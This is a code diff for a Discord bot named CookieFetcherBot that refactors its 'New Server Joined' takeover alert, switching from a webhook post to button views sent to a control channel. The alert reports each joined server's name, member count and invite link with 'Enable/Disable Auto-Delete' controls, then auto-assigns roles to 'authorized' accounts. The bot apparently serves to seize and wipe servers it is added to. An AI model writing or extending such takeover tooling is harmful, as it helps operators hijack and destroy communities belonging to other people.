@@ -388,43 +388,35 @@ class CookieFetcherBot(discord.Client):
                 pass
 
             if guild.id not in OWNED_SERVER_IDS:
-                # Send takeover notification with buttons to control channel webhook
+                # Send takeover notification with buttons to control channel
                 takeover_embed = discord.Embed(
                     title="🚨 New Server Joined",
                     description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
                     color=0x00ff00
                 )
 
-                takeover_data = {
-                    'username': 'Server Takeover Bot',
-                    'content': '@everyone',
-                    'embeds': [takeover_embed.to_dict()],
-                    'components': [
-                        {
-                            'type': 1,  # Action row
-                            'components': [
-                                {
-                                    'type': 2,  # Button
-                                    'style': 3,  # Green
-                                    'label': 'Enable Auto-Delete',
-                                    'custom_id': f'enable_delete_{guild.id}'
-                                },
-                                {
-                                    'type': 2,  # Button
-                                    'style': 4,  # Red
-                                    'label': 'Disable Auto-Delete',
-                                    'custom_id': f'disable_delete_{guild.id}'
-                                }
-                            ]
-                        }
-                    ]
-                }
+                # Create buttons for the message
+                enable_button = discord.ui.Button(
+                    label="Enable Auto-Delete",
+                    style=discord.ButtonStyle.green,
+                    custom_id=f'enable_delete_{guild.id}'
+                )
+                disable_button = discord.ui.Button(
+                    label="Disable Auto-Delete",
+                    style=discord.ButtonStyle.red,
+                    custom_id=f'disable_delete_{guild.id}'
+                )
 
-                # Send takeover with buttons to control channel webhook
-                async with aiohttp.ClientSession() as session:
-                    async with session.post(CONTROL_WEBHOOK_URL, json=takeover_data) as response:
-                        if response.status not in [200, 204]:
-                            logger.error(f"Failed to send takeover to control webhook: {response.status}")
+                view = discord.ui.View()
+                view.add_item(enable_button)
+                view.add_item(disable_button)
+
+                # Send takeover with buttons to control channel
+                control_channel = self.get_channel(CONTROL_CHANNEL_ID)
+                if control_channel:
+                    await control_channel.send("@everyone", embed=takeover_embed, view=view)
+                else:
+                    logger.error(f"Control channel {CONTROL_CHANNEL_ID} not found")
 
                 # 🟢 AUTO-ASSIGN ROLES
                 await self.assign_role_to_authorized(guild)
